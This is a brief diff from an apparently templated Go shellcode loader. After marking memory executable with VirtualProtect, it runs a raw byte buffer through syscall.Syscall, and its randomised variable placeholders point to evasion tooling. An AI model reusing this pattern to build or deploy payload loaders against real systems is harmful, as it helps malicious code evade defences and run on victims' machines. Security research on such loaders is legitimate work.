@@ -562,7 +562,8 @@ func Binary() string {
 			panic("Call to VirtualProtect failed!")
 		}
 
-		{{.Variables.ptr}}()
+		syscall.Syscall(uintptr(unsafe.Pointer(&{{.Variables.raw_bin}}[0])),0, 0, 0, 0,)
+
 	
 	}
 	func {{.Variables.Reloading}}(name string) error {
